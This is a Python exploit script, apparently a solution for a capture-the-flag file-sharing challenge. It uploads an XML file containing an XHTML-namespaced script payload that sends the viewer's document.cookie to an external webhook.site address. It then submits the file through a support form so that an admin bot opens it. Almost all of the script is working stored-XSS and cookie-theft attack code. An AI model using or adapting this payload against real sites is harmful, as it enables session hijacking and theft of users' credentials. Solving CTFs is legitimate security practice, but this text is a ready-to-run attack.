import requests
from bs4 import BeautifulSoup 


CHALL_URL = "https://fileshare.challs.open.ecsc2024.it"
# CHALL_URL = "http://localhost:3000"
ENDPOINT = "ENDPOINT"

client = requests.Session()

def upload():
    file = {'file':('payload.txt','<x:script xmlns:x="http://www.w3.org/1999/xhtml">window.location=\'//webhook.site/30a6425b-1772-4ce8-aa4c-9b2918c4b674?\'+document.cookie;</x:script>','text/xml')}
    r = client.post(CHALL_URL + '/upload.php', files=file)
    assert r.status_code == 200
    r = client.get(CHALL_URL + '/files.php')
    soup = BeautifulSoup(r.content, "html.parser")                                                                                                                                                    
    id = soup.find_all('li')[-1]['id']                                                                                                                             
    return id 

def report(file_id):
    # Note that this payload is URL encoded again by Requests package
    payload = {
        "email": "fake@fake.com",
        "fileid": file_id,
        "message": "superlongmessage"
    }
    print(f"[DEBUG] {CHALL_URL}/download.php?id={file_id}")
    r = requests.post(CHALL_URL + "/support.php", payload)
    print(f"[DONE!] Go to your endpoint and submit the flag!")


# Boom!
r = client.get(CHALL_URL)
assert r.status_code == 200
file_id = upload()
report(file_id)
